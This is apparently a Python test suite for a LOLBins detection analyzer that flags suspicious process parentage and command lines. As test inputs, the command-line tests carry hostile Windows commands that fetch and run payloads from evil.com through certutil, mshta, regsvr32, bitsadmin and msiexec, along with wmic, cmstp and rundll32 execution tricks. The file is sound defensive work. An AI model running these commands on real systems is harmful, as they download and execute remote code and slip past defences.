"""Tests for LOLBins behavioral analysis."""
from __future__ import annotations

from aegis.detection.lolbins_analyzer import LOLBinFinding, LOLBinsAnalyzer

# ================================================================== #
#  Parent-child process analysis tests
# ================================================================== #


class TestParentChildAnalysis:
    """Tests for suspicious parent-child process relationships."""

    def test_office_spawning_powershell(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_parent_child(
            "winword.exe", "powershell.exe", "",
        )
        assert result is not None
        assert result.severity == "high"

    def test_office_spawning_cmd(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_parent_child(
            "excel.exe", "cmd.exe", "",
        )
        assert result is not None

    def test_office_spawning_wscript(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_parent_child(
            "powerpnt.exe", "wscript.exe", "",
        )
        assert result is not None

    def test_office_spawning_cscript(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_parent_child(
            "outlook.exe", "cscript.exe", "",
        )
        assert result is not None

    def test_office_spawning_mshta(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_parent_child(
            "msaccess.exe", "mshta.exe", "",
        )
        assert result is not None

    def test_office_spawning_rundll32(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_parent_child(
            "winword.exe", "rundll32.exe", "",
        )
        assert result is not None

    def test_office_spawning_regsvr32(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_parent_child(
            "excel.exe", "regsvr32.exe", "",
        )
        assert result is not None

    def test_normal_parent_child(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_parent_child(
            "explorer.exe", "notepad.exe", "",
        )
        assert result is None

    def test_normal_explorer_spawning_chrome(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_parent_child(
            "explorer.exe", "chrome.exe", "",
        )
        assert result is None

    def test_case_insensitive_parent_child(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_parent_child(
            "WINWORD.EXE", "PowerShell.EXE", "",
        )
        assert result is not None

    def test_finding_has_mitre_id(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_parent_child(
            "winword.exe", "powershell.exe", "",
        )
        assert result is not None
        assert result.mitre_id is not None
        assert len(result.mitre_id) > 0

    def test_finding_has_description(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_parent_child(
            "winword.exe", "powershell.exe", "",
        )
        assert result is not None
        assert result.description is not None
        assert len(result.description) > 0

    def test_finding_has_matched_rule(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_parent_child(
            "winword.exe", "powershell.exe", "",
        )
        assert result is not None
        assert result.matched_rule is not None
        assert len(result.matched_rule) > 0


# ================================================================== #
#  Command-line analysis tests
# ================================================================== #


class TestCommandLineAnalysis:
    """Tests for suspicious command-line patterns."""

    def test_certutil_download(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_command_line(
            "certutil.exe",
            "certutil -urlcache -split -f http://evil.com/payload.exe",
        )
        assert result is not None
        assert "download" in result.description.lower()

    def test_certutil_decode(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_command_line(
            "certutil.exe",
            "certutil -decode encoded.txt decoded.exe",
        )
        assert result is not None
        assert result.severity == "medium"

    def test_normal_certutil(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_command_line(
            "certutil.exe", "certutil -dump cert.pem",
        )
        assert result is None

    def test_mshta_with_url(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_command_line(
            "mshta.exe",
            "mshta http://evil.com/payload.hta",
        )
        assert result is not None

    def test_mshta_with_https_url(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_command_line(
            "mshta.exe",
            "mshta https://evil.com/payload.hta",
        )
        assert result is not None

    def test_mshta_with_inline_script(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_command_line(
            "mshta.exe",
            "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\")"
            ".Run \"\"powershell\"\"\")",
        )
        assert result is not None

    def test_regsvr32_scrobj(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_command_line(
            "regsvr32.exe",
            "regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll",
        )
        assert result is not None

    def test_rundll32_javascript(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_command_line(
            "rundll32.exe",
            'rundll32 javascript:"\\..\\mshtml,RunHTMLApplication"',
        )
        assert result is not None

    def test_bitsadmin_transfer(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_command_line(
            "bitsadmin.exe",
            "bitsadmin /transfer job1 http://evil.com/payload.exe "
            "C:\\temp\\payload.exe",
        )
        assert result is not None

    def test_wmic_process_create(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_command_line(
            "wmic.exe",
            "wmic process call create \"powershell -ep bypass\"",
        )
        assert result is not None

    def test_cmstp_inf(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_command_line(
            "cmstp.exe",
            "cmstp /s C:\\temp\\bypass.inf",
        )
        assert result is not None

    def test_msiexec_remote(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_command_line(
            "msiexec.exe",
            "msiexec /q /i http://evil.com/payload.msi",
        )
        assert result is not None

    def test_case_insensitive_binary(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_command_line(
            "CERTUTIL.EXE",
            "certutil -urlcache -split -f http://evil.com/payload.exe",
        )
        assert result is not None

    def test_case_insensitive_command_line(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_command_line(
            "certutil.exe",
            "CERTUTIL -URLCACHE -SPLIT -F HTTP://EVIL.COM/PAYLOAD.EXE",
        )
        assert result is not None

    def test_unknown_binary_returns_none(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_command_line(
            "notepad.exe", "notepad.exe C:\\file.txt",
        )
        assert result is None


# ================================================================== #
#  LOLBinFinding dataclass tests
# ================================================================== #


class TestLOLBinFinding:
    """Tests for the LOLBinFinding dataclass."""

    def test_finding_fields(self):
        finding = LOLBinFinding(
            binary="certutil.exe",
            severity="high",
            mitre_id="T1105",
            description="Certutil used for file download",
            matched_rule="certutil_download",
        )
        assert finding.binary == "certutil.exe"
        assert finding.severity == "high"
        assert finding.mitre_id == "T1105"
        assert finding.description == "Certutil used for file download"
        assert finding.matched_rule == "certutil_download"


# ================================================================== #
#  Process event analysis tests
# ================================================================== #


class TestAnalyzeProcessEvent:
    """Tests for analyze_process_event with AegisEvent objects."""

    def test_analyze_malicious_event(self):
        from aegis.core.models import AegisEvent, SensorType

        analyzer = LOLBinsAnalyzer()
        event = AegisEvent(
            sensor=SensorType.PROCESS,
            event_type="process_create",
            data={
                "parent_name": "winword.exe",
                "process_name": "powershell.exe",
                "command_line": "powershell -ep bypass -nop",
            },
        )
        findings = analyzer.analyze_process_event(event)
        assert len(findings) >= 1

    def test_analyze_clean_event(self):
        from aegis.core.models import AegisEvent, SensorType

        analyzer = LOLBinsAnalyzer()
        event = AegisEvent(
            sensor=SensorType.PROCESS,
            event_type="process_create",
            data={
                "parent_name": "explorer.exe",
                "process_name": "notepad.exe",
                "command_line": "notepad.exe C:\\file.txt",
            },
        )
        findings = analyzer.analyze_process_event(event)
        assert len(findings) == 0

    def test_analyze_event_with_command_line_match(self):
        from aegis.core.models import AegisEvent, SensorType

        analyzer = LOLBinsAnalyzer()
        event = AegisEvent(
            sensor=SensorType.PROCESS,
            event_type="process_create",
            data={
                "parent_name": "cmd.exe",
                "process_name": "certutil.exe",
                "command_line": (
                    "certutil -urlcache -split -f "
                    "http://evil.com/payload.exe"
                ),
            },
        )
        findings = analyzer.analyze_process_event(event)
        assert len(findings) >= 1
        assert any(
            "download" in f.description.lower() for f in findings
        )

    def test_analyze_event_missing_fields(self):
        from aegis.core.models import AegisEvent, SensorType

        analyzer = LOLBinsAnalyzer()
        event = AegisEvent(
            sensor=SensorType.PROCESS,
            event_type="process_create",
            data={},
        )
        findings = analyzer.analyze_process_event(event)
        assert len(findings) == 0

    def test_analyze_event_both_checks_match(self):
        from aegis.core.models import AegisEvent, SensorType

        analyzer = LOLBinsAnalyzer()
        event = AegisEvent(
            sensor=SensorType.PROCESS,
            event_type="process_create",
            data={
                "parent_name": "winword.exe",
                "process_name": "mshta.exe",
                "command_line": "mshta http://evil.com/payload.hta",
            },
        )
        findings = analyzer.analyze_process_event(event)
        # Both parent-child and command-line should match
        assert len(findings) >= 2
